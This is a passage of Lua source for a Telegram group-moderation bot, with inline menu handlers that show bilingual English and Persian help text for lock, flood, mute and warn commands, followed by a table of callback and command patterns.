                    text = "Other Commands",
                    callback_data = "GetGpCmdsMods3:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            else
              text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\218\169\216\167\216\177 \216\168\216\167 \217\130\217\129\217\132 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135",
                    callback_data = "GetGpCmdsMods1:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\218\169\216\167\216\177 \216\168\216\167 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \216\185\216\175\216\175\219\140",
                    callback_data = "GetGpCmdsMods2:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\175\219\140\218\175\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170",
                    callback_data = "GetGpCmdsMods3:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\133\216\170\216\186\219\140\216\177 \217\135\216\167",
                    callback_data = "GetGpCmdsMods4:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsMods1" then
            keyboard = {}
            if not lang then
              text = [[
*Work With Group Locks:*
For Lock an item use `lock` commands and for unlock it use `lock` or `unlock`:

edit
link
tags
flood
spam
mention
arabic
webpage
markdown
pin message
Max Words
Bots protection
all
gif
text
inline
game
photo
video
audio
voice
sticker
contact
forward
location
document
tgservice
keyboard
bot chat
fohsh
English
Forced Invite
UserName (@)
Join]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                }
              }
            else
              text = "`\218\169\216\167\216\177 \216\168\216\167 \217\130\217\129\217\132 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135:`\n\216\168\216\177\216\167\219\140 \217\130\217\129\217\132 \218\169\216\177\216\175\217\134 \219\140\218\169\219\140 \216\167\216\178 \217\133\217\136\216\167\216\177\216\175 \216\178\219\140\216\177 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 lock \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \217\136 \216\168\216\177\216\167\219\140 \216\168\216\167\216\178 \218\169\216\177\216\175\217\134 \216\162\217\134\216\167\217\134 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \217\135\217\133\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \219\140\216\167 \216\175\216\179\216\170\217\136\216\177 unlock \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175:\n\n\216\167\216\175\219\140\216\170\n\217\132\219\140\217\134\218\169\n\216\170\218\175\n\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140\n\216\167\216\179\217\190\217\133\n\217\133\217\134\216\180\217\134\n\216\185\216\177\216\168\219\140\n\216\181\217\129\216\173\216\167\216\170 \217\136\216\168\n\217\129\217\136\217\134\216\170\n\217\190\219\140\217\134\n\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170\n\216\177\216\168\216\167\216\170 \217\135\216\167\n\218\175\216\177\217\136\217\135\n\218\175\219\140\217\129\n\217\133\216\170\217\134\n\216\167\219\140\217\134\217\132\216\167\219\140\217\134\n\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134\n\216\185\218\169\216\179\n\217\129\219\140\217\132\217\133\n\216\162\217\135\217\134\218\175\n\216\181\216\175\216\167\n\216\167\216\179\216\170\219\140\218\169\216\177\n\217\133\216\174\216\167\216\183\216\168\n\217\129\217\136\216\177\217\136\216\167\216\177\216\175\n\217\133\218\169\216\167\217\134\n\217\129\216\167\219\140\217\132\n\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133\n\216\181\217\129\216\173\217\135 \218\169\217\132\219\140\216\175\n\218\134\216\170 \216\177\216\168\216\167\216\170\n\217\129\216\173\216\180\n\216\167\217\134\218\175\217\132\219\140\216\179\219\140\n\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140\n\219\140\217\136\216\178\216\177\217\134\219\140\217\133 (@)\n\217\136\216\177\217\136\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsMods2" then
            keyboard = {}
            if not lang then
              text = [[
*Work With Number items:*
General Commands: set(Operation) Number

Operations:
1-flood: Users who send a message to the specified number are sent or their message will be deleted.

2-floodtime: Users who During this time a certain number of messages will be removed or their message will be deleted

3-maxwarn: Determine the amount of alert for dismissing or silencing a user

4-maxwords: Messages whose words are too high More will be deleted

5-forcedinvite: Number of members to invite the user to the group for permission to chat]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                }
              }
            else
              text = "`\218\169\216\167\216\177 \216\168\216\167 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \216\185\216\175\216\175\219\140:`\n\216\175\216\179\216\170\217\136\216\177 \218\169\217\132\219\140: \216\170\217\134\216\184\219\140\217\133 (\216\185\217\133\217\132\219\140\216\167\216\170) \216\185\216\175\216\175\n\n\216\185\217\133\217\132\219\140\216\167\216\170 \217\135\216\167:\n1- \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: \218\169\216\167\216\177\216\168\216\177\216\167\217\134\219\140 \218\169\217\135 \216\168\217\135 \216\170\216\185\216\175\216\167\216\175 \216\170\216\185\219\140\219\140\217\134 \216\180\216\175\217\135 \217\190\216\180\216\170 \216\179\216\177 \217\135\217\133 \217\190\219\140\216\167\217\133 \216\168\217\129\216\177\216\179\216\170\217\134\216\175 \216\167\216\174\216\177\216\167\216\172 \217\133\219\140\216\180\217\136\217\134\216\175 \219\140\216\167 \217\190\219\140\216\167\217\133 \216\162\217\134 \217\135\216\167 \217\190\216\167\218\169 \217\133\219\140\216\180\217\136\216\175\n\n2-\216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: \218\169\216\167\216\177\216\168\216\177\216\167\217\134\219\140 \218\169\217\135 \216\175\216\177 \216\183\217\136\217\132 \216\167\219\140\217\134 \216\178\217\133\216\167\217\134 \216\170\216\185\216\175\216\167\216\175 \217\133\216\185\219\140\217\134\219\140 \217\190\219\140\216\167\217\133 \216\168\217\129\216\177\216\179\216\170\217\134\216\175 \216\167\216\174\216\177\216\167\216\172 \217\133\219\140\216\180\217\136\217\134\216\175 \219\140\216\167 \217\190\219\140\216\167\217\133 \216\162\217\134 \217\135\216\167 \217\190\216\167\218\169 \217\133\219\140\216\180\217\136\216\175\n\n3-\216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177: \216\170\216\185\219\140\219\140\217\134 \217\133\219\140\216\178\216\167\217\134 \216\167\216\174\216\183\216\167\216\177 \216\168\216\177\216\167\219\140 \216\167\216\174\216\177\216\167\216\172 \219\140\216\167 \216\179\216\167\218\169\216\170 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\n\n4-\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170: \217\190\219\140\216\167\217\133 \217\135\216\167\219\140\219\140 \218\169\217\135 \218\169\217\132\217\133\216\167\216\170 \216\162\217\134 \216\167\216\178 \216\173\216\175 \216\170\216\185\219\140\219\140\217\134 \216\180\216\175\217\135 \216\168\219\140\216\180\216\170\216\177 \216\168\216\167\216\180\216\175 \216\173\216\176\217\129 \217\133\219\140\216\180\217\136\217\134\216\175\n\n5-\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140: \216\170\216\185\216\175\216\167\216\175 \216\185\216\182\217\136 \216\168\216\177\216\167\219\140 \216\175\216\185\217\136\216\170 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177 \216\168\217\135 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\167\216\172\216\167\216\178\217\135 \216\168\217\135 \218\134\216\170 \218\169\216\177\216\175\217\134"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsMods3" then
            keyboard = {}
            if not lang then
              text = [[
*Other Commands:*
id: Get ID of User

pin: Pin A Message in Group

unpin: Unpin A Message From Group

settings: Show Group Settings

setname: Set Group Name

setwelcome: Set Group Welcome

welcome (on/off): Set Welcome ON or OFF

mute time (NUMBER): Change Time of Mute User

mute (sticker/photo/video/voice/audio/gif) (ID)

unmute (sticker/photo/video/voice/audio/gif) (ID)

mymute: Get Time of Your Mute

silent: Silent User From Group

unsilent: Unsilent User From Group

silentlist: Show Silent List

block: Kick User From Group

delall: Delete All Message of User

filter: Filter Word From Group or Unfilter

allow: Allow Word or User From Group

allowlist: Show Allow List

report: Report A Text of User

reportlist: Show Report List

check: Check Groups Charge

votemute (ID): Vote For Mute User

delmute (ID): Delete Votes of User

warn (Reason): Warn User With Reason

delwarn (ID): Delete Warn of User

nerkh: Show Bot Nerk]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\175\219\140\218\175\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170:`\n\216\167\219\140\216\175\219\140: \217\134\217\133\216\167\219\140\216\180 \216\162\219\140\216\175\219\140 \219\140\218\169 \216\180\216\174\216\181\n\n\216\170\217\134\216\184\219\140\217\133 \216\178\217\133\216\167\217\134 \216\177\218\175\216\168\216\167\216\177\219\140 (\216\185\216\175\216\175)\n\n\216\179\217\134\216\172\216\167\217\130: \216\179\217\134\216\172\216\167\217\130 \218\169\216\177\216\175\217\134 \217\190\219\140\216\167\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135\n\n\218\169\217\134\216\175\217\134 \216\179\217\134\216\172\216\167\217\130: \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\217\134\216\172\216\167\217\130 \217\190\219\140\216\167\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135\n\n\216\170\217\134\216\184\219\140\217\133\216\167\216\170: \217\134\217\133\216\167\219\140\216\180 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135\n\n\216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134: \216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135\n\n\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133: \216\170\217\134\216\184\219\140\217\133 \216\167\216\179\217\133 \218\175\216\177\217\136\217\135\n\n\216\170\217\134\216\184\219\140\217\133 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140: \216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135\n\n\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 (\216\177\217\136\216\180\217\134/\216\174\216\167\217\133\217\136\216\180): \216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140\n\n\217\133\219\140\217\136\216\170 (\216\167\216\179\216\170\219\140\218\169\216\177/\216\185\218\169\216\179/\217\129\219\140\217\132\217\133/\216\181\216\175\216\167/\216\162\217\135\217\134\218\175/\218\175\219\140\217\129/\216\175\216\179\216\170\217\136\216\177\216\167\216\170) (\216\162\219\140\216\175\219\140)\n\n\216\162\217\134\217\133\219\140\217\136\216\170 (\216\167\216\179\216\170\219\140\218\169\216\177/\216\185\218\169\216\179/\217\129\219\140\217\132\217\133/\216\181\216\175\216\167/\216\162\217\135\217\134\218\175/\218\175\219\140\217\129/\216\175\216\179\216\170\217\136\216\177\216\167\216\170) (\216\162\219\140\216\175\219\140)\n\n\216\179\218\169\217\136\216\170: \216\174\217\129\217\135 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \218\175\216\177\217\136\217\135\n\n\216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170: \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \218\175\216\177\217\136\217\135\n\n\217\133\216\179\216\175\217\136\216\175: \216\167\216\174\216\177\216\167\216\172 \216\180\216\174\216\181 \216\167\216\178 \218\175\216\177\217\136\217\135\n\n\217\129\219\140\217\132\216\170\216\177 (\218\169\217\132\217\133\217\135): \217\129\219\140\217\132\216\170\216\177 \218\169\217\132\217\133\217\135 \216\167\216\178 \218\175\216\177\217\136\217\135 \219\140\216\167 \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\162\217\134\n\n\217\133\216\172\216\167\216\178: \217\133\216\172\216\167\216\178 \218\169\216\177\216\175\217\134 \219\140\218\169 \218\169\217\132\217\133\217\135 \219\140\216\167 \216\180\216\174\216\181 \216\175\216\177 \218\175\216\177\217\136\217\135\n\n\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178: \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178\n\n\218\175\216\178\216\167\216\177\216\180: \218\175\216\178\216\167\216\177\216\180 \219\140\218\169 \217\133\216\170\217\134 \216\167\216\178 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\167 \216\177\219\140\217\190\217\132\216\167\219\140\n\n\217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180: \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180\216\167\216\170\n\n\216\168\216\177\216\177\216\179\219\140: \218\134\218\169 \218\169\216\177\216\175\217\134 \216\180\216\167\216\177\218\152 \219\140\218\169 \218\175\216\177\217\136\217\135\n\n\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 (\216\162\219\140\216\175\219\140): \216\177\216\167\219\140 \216\175\216\167\216\175\217\134 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 \216\180\216\175\217\134 \219\140\218\169 \216\180\216\174\216\181\n\n\216\173\216\176\217\129 \217\133\219\140\217\136\216\170 (\216\162\219\140\216\175\219\140): \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\177\216\167\219\140 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170\n\n\216\167\216\174\216\183\216\167\216\177 (\216\175\217\132\219\140\217\132): \216\167\216\174\216\183\216\167\216\177 \216\168\217\135 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\167 \216\175\217\132\219\140\217\132\n\n\216\173\216\176\217\129 \216\167\216\174\216\183\216\167\216\177 (\216\162\219\140\216\175\219\140): \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\216\174\216\183\216\167\216\177 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177\n\n\217\134\216\177\216\174: \217\134\217\133\216\167\219\140\216\180 \217\134\216\177\216\174 \216\177\216\168\216\167\216\170"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsMods4" then
            keyboard = {}
            text = "`\217\133\216\170\216\186\219\140\216\177 \217\135\216\167:`\n\216\175\216\177 \217\133\216\170\217\134 \216\174\217\136\216\180 \216\162\217\133\216\175\218\175\217\136\219\140\219\140 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \217\133\216\170\216\186\219\140\216\177 \217\135\216\167\219\140 \216\178\219\140\216\177 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175:\n\n`NAME`\n\217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`GPNAME`\n\217\134\216\167\217\133 \218\175\216\177\217\136\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`USERNAME`\n\219\140\217\136\216\178\216\177\217\134\219\140\217\133 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`USERID`\n\216\180\217\134\216\167\216\179\217\135 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`INVITER.ID`\n\216\162\219\140\216\175\219\140 \216\175\216\185\217\136\216\170 \218\169\217\134\217\134\216\175\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`INVITER.NAME`\n\217\134\216\167\217\133 \216\175\216\185\217\136\216\170 \218\169\217\134\217\134\216\175\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`INVITER.USERNAME`\n\219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\175\216\185\217\136\216\170 \218\169\217\134\217\134\216\175\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n\n`TIME`\n\216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            keyboard.inline_keyboard = {
              {
                {
                  text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                  callback_data = "GetGpCmdsMods:" .. matches[2]
                }
              }
            }
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsFun" then
            if not is_mod(matches[2], msg.from.id) then
              return ErrorAccess
            end
            keyboard = {}
            if not lang then
              text = [[
Fun Tools:
`time`: Get Server Time In Sticker

`tovoice` text: Convert Text To Voice

`video` name: Search Video in YouTube

`poll` Question: Request A Poll

`bold` text: Write Text With Bold Font

`italic` text: Write Text With Italic Font

`code` text: Write Text With Code Font]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            else
              text = "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140:\n`\216\178\217\133\216\167\217\134`: \217\133\216\180\216\167\217\135\216\175\217\135 \216\178\217\133\216\167\217\134 \216\179\216\177\217\136\216\177 \216\175\216\177 \217\130\216\167\217\132\216\168 \216\167\216\179\216\170\219\140\218\169\216\177\n\n`\216\168\217\135 \216\181\216\175\216\167` \217\133\216\170\217\134: \216\170\216\168\216\175\219\140\217\132 \217\133\216\170\217\134 \216\168\217\135 \216\181\216\175\216\167\n\n`\217\129\219\140\217\132\217\133` \217\134\216\167\217\133: \216\172\216\179\216\170\216\172\217\136 \217\129\219\140\217\132\217\133 \216\175\216\177 \219\140\217\136\216\170\219\140\217\136\216\168\n\n`\217\134\216\184\216\177\216\179\217\134\216\172\219\140` \216\179\217\136\216\167\217\132: \216\175\216\177\216\174\217\136\216\167\216\179\216\170 \219\140\218\169 \217\134\216\184\216\177\216\179\217\134\216\172\219\140\n\n`\217\133\216\170\217\134 \218\169\217\132\217\129\216\170` \217\133\216\170\217\134: \217\134\217\136\216\180\216\170\217\134 \217\133\216\170\217\134 \216\168\216\167 \217\129\217\136\217\134\216\170 \218\169\217\132\217\129\216\170\n\n`\217\133\216\170\217\134 \218\169\216\172` \217\133\216\170\217\134: \217\134\217\136\216\180\216\170\217\134 \217\133\216\170\217\134 \216\168\216\167 \217\129\217\136\217\134\216\170 \218\169\216\172 \217\134\217\136\219\140\216\179\219\140\n\n`\217\133\216\170\217\134 \218\169\216\175` \217\133\216\170\217\134: \217\134\217\136\216\180\216\170\217\134 \217\133\216\170\217\134 \216\168\216\167 \217\129\217\136\217\134\216\170 \218\169\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
        end
      end
    end
  else
  end
end
_config = loadfile("./data/config.lua")()
return {
  inline = {
    "^-(%d+)$",
    "^(reload)$",
    "^###cb:(%d+)$",
    "^###cb:(NoProcess):(.*)$",
    "^###cb:(GetGpCmds):(.*)$",
    "^###cb:(GetGpCmdsFun):(.*)$",
    "^###cb:(GetGpCmdsSym):(.*)$",
    "^###cb:(GetGpCmdsSudo):(.*)$",
    "^###cb:(GetGpCmdsSudo1):(.*)$",
    "^###cb:(GetGpCmdsSudo2):(.*)$",
    "^###cb:(GetGpCmdsSudo3):(.*)$",
    "^###cb:(GetGpCmdsSudo4):(.*)$",
    "^###cb:(GetGpCmdsSudo5):(.*)$",
    "^###cb:(GetGpCmdsSudo6):(.*)$",
    "^###cb:(GetGpCmdsSudo7):(.*)$",
    "^###cb:(GetGpCmdsOwner):(.*)$",
    "^###cb:(GetGpCmdsOwner1):(.*)$",
    "^###cb:(GetGpCmdsOwner2):(.*)$",
    "^###cb:(GetGpCmdsOwner3):(.*)$",
    "^###cb:(GetGpCmdsOwner4):(.*)$",
    "^###cb:(GetGpCmdsOwner5):(.*)$",
    "^###cb:(GetGpCmdsMods):(.*)$",
    "^###cb:(GetGpCmdsMods1):(.*)$",
    "^###cb:(GetGpCmdsMods2):(.*)$",
    "^###cb:(GetGpCmdsMods3):(.*)$",
    "^###cb:(GetGpCmdsMods4):(.*)$",
    "^###cb:(GetGpCmdsExit):(.*)$",
    "^###cb:(Tools):(.*)$",
    "^###cb:(ToolsWelcome):(.*)$",
    "^###cb:(ToolsSense):(.*)$",
    "^###cb:(ToolsWithCaption):(.*)$",
    "^###cb:(ToolsNoCaption):(.*)$",
    "^###cb:(ToolsReaction):(.*)$",
    "^###cb:(ToolsCmds):(.*)$",
    "^###cb:(ToolsHelp):(.*)$",
    "^###cb:(Help:Sudo):(.*)$",
    "^###cb:(Help:Owner):(.*)$",
    "^###cb:(Help:Mods):(.*)$",
    "^###cb:(Cmds1):(.*)$",
    "^###cb:(Cmds2):(.*)$",
    "^###cb:(Cmds3):(.*)$",
    "^###cb:(ToolsLockgp):(.*)$",
    "^###cb:(-Lockgp):(.*)$",
    "^###cb:(+Lockgp):(.*)$",
    "^###cb:(Applylockgp):(.*)$",
    "^###cb:(Unlockgp):(.*)$",
    "^###cb:(Support):(.*)$",
    "^###cb:(Supportgp):(.*)$",
    "^###cb:(HelpLink):(.*)$",
    "^###cb:(HelpRules):(.*)$",
    "^###cb:(HelpWelcome):(.*)$",
    "^###cb:(HelpMods):(.*)$",
    "^###cb:(HelpAllow):(.*)$",
    "^###cb:(HelpFilterList):(.*)$",
    "^###cb:(HelpSilentList):(.*)$",
    "^###cb:(HelpExpire):(.*)$",
    "^###cb:(Info):(.*)$",
    "^###cb:(InfoRules):(.*)$",
    "^###cb:(InfoWelcome):(.*)$",
    "^###cb:(InfoLink):(.*)$",
    "^###cb:(InfoAllow):(.*)$",
    "^###cb:(InfoMods):(.*)$",
    "^###cb:(InfoFilterList):(.*)$",
    "^###cb:(InfoSilentList):(.*)$",
    "^###cb:(InfoExpire):(.*)$",
    "^###cb:(Cleans):(.*)$",
    "^###cb:(Cleans2):(.*)$",
    "^###cb:(CleanMods):(.*)$",
    "^###cb:(CleanAllow):(.*)$",
    "^###cb:(CleanFilterList):(.*)$",
    "^###cb:(CleanRules):(.*)$",
    "^###cb:(CleanWelcome):(.*)$",
    "^###cb:(CleanSilentList):(.*)$",
    "^###cb:(Settings):(.*)$",
    "^###cb:(Settings2):(.*)$",
    "^###cb:(Settings3):(.*)$",
    "^###cb:(Settings4):(.*)$",
    "^###cb:(-5Flood):(.*)$",
    "^###cb:(-1Flood):(.*)$",
    "^###cb:(+1Flood):(.*)$",
    "^###cb:(+5Flood):(.*)$",
    "^###cb:(-5MaxWarn):(.*)$",
    "^###cb:(-1MaxWarn):(.*)$",
    "^###cb:(+1MaxWarn):(.*)$",
    "^###cb:(+5MaxWarn):(.*)$",
    "^###cb:(-100MaxWords):(.*)$",
    "^###cb:(-10MaxWords):(.*)$",
    "^###cb:(+10MaxWords):(.*)$",
    "^###cb:(+100MaxWords):(.*)$",
    "^###cb:(-5Forced):(.*)$",
    "^###cb:(-1Forced):(.*)$",
    "^###cb:(+1Forced):(.*)$",
    "^###cb:(+5Forced):(.*)$",
    "^###cb:(-5FloodTime):(.*)$",
    "^###cb:(-1FloodTime):(.*)$",
    "^###cb:(+1FloodTime):(.*)$",
    "^###cb:(+5FloodTime):(.*)$",
    "^###cb:(NumberSettings):(.*)$",
    "^###cb:(Manager):(.*)$",
    "^###cb:(Exit):(.*)$",
    "^###cb:(mute_all):(.*)$",
    "^###cb:(mute_gif):(.*)$",
    "^###cb:(mute_text):(.*)$",
    "^###cb:(mute_photo):(.*)$",
    "^###cb:(mute_video):(.*)$",
    "^###cb:(mute_audio):(.*)$",
    "^###cb:(mute_voice):(.*)$",
    "^###cb:(mute_sticker):(.*)$",
    "^###cb:(mute_contact):(.*)$",
    "^###cb:(mute_forward):(.*)$",
    "^###cb:(mute_location):(.*)$",
    "^###cb:(mute_document):(.*)$",
    "^###cb:(mute_tgservice):(.*)$",
    "^###cb:(mute_inline):(.*)$",
    "^###cb:(mute_game):(.*)$",
    "^###cb:(mute_keyboard):(.*)$",
    "^###cb:(lock_link):(.*)$",
    "^###cb:(lock_tag):(.*)$",
    "^###cb:(lock_username):(.*)$",
    "^###cb:(lock_join):(.*)$",
    "^###cb:(lock_note):(.*)$",
    "^###cb:(lock_mention):(.*)$",
    "^###cb:(lock_arabic):(.*)$",
    "^###cb:(lock_edit):(.*)$",
    "^###cb:(lock_spam):(.*)$",
    "^###cb:(lock_flood):(.*)$",
    "^###cb:(lock_bots):(.*)$",
    "^###cb:(lock_markdown):(.*)$",
    "^###cb:(lock_webpage):(.*)$",
    "^###cb:(lock_pin):(.*)$",
    "^###cb:(lock_MaxWords):(.*)$",
    "^###cb:(lock_botchat):(.*)$",
    "^###cb:(lock_fohsh):(.*)$",
    "^###cb:(lock_english):(.*)$",
    "^###cb:(lock_forcedinvite):(.*)$"
  },
  patterns = {
    _config.cmd .. "([Ii]d)$",
    "^(\216\162\219\140\216\175\219\140)$",
    "^(\216\167\219\140\216\175\219\140)$",
    _config.cmd .. "([Vv]ip)$",
    _config.cmd .. "([Vv]ip) (.*)$",
    _config.cmd .. "([Aa]dd[Gg]ift) (.*)$",
    "^(\216\179\216\167\216\174\216\170 \217\135\216\175\219\140\217\135) (.*)$",
    _config.cmd .. "([Gg]ift) (.*)$",
    "^(\217\135\216\175\219\140\217\135) (.*)$",
    _config.cmd .. "([Ii]nstall)$",
    "^(\217\134\216\181\216\168 \218\175\216\177\217\136\217\135)$",
    _config.cmd .. "([Ii]nstall) (%d+)$",
    "^(\217\134\216\181\216\168 \218\175\216\177\217\136\217\135) (%d+)$",
    _config.cmd .. "([Rr]emove)$",
    "^(\216\173\216\176\217\129 \218\175\216\177\217\136\217\135)$",
    _config.cmd .. "([Rr]emove) (.*)$",
    "^(\216\173\216\176\217\129 \218\175\216\177\217\136\217\135) (.*)$",
    _config.cmd .. "([Ii]d) (.*)$",
    "^(\216\162\219\140\216\175\219\140) (.*)$",
    _config.cmd .. "([Ss]et[Cc]hannel) (.*)",
    "^(\216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132) (.*)",
    _config.cmd .. "([Pp]in)$",
    "^(\216\179\217\134\216\172\216\167\217\130)$",
    _config.cmd .. "([Uu]npin)$",
    "^(\218\169\217\134\216\175\217\134 \216\179\217\134\216\172\216\167\217\130)$",
    _config.cmd .. "([Ss]etowner)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\181\216\167\216\173\216\168)$",
    _config.cmd .. "([Ss]etowner) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\181\216\167\216\173\216\168) (.*)$",
    _config.cmd .. "([Dd]elowner)$",
    "^(\216\173\216\176\217\129 \216\181\216\167\216\173\216\168)$",
    _config.cmd .. "([Dd]elowner) (.*)$",
    "^(\216\173\216\176\217\129 \216\181\216\167\216\173\216\168) (.*)$",
